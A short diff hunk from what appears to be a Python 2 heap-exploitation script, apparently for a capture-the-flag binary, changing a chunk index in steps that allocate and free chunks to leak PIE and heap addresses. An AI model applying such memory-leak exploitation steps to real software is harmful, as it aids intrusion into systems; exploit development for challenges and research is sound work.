@@ -37,8 +37,8 @@ print "[+] pie: 0x%x" % pie
 add(0, 0x10, "")
 add(1, 0x10, "")
 add(2, 0x10, "")
-add(4, 0x10, "")
-delete(4)
+add(3, 0x10, "")
+delete(3)
 delete(1)
 heap = u64(ver(1).ljust(8, '\0'))
 print "[+] heap: 0x%x" % heap
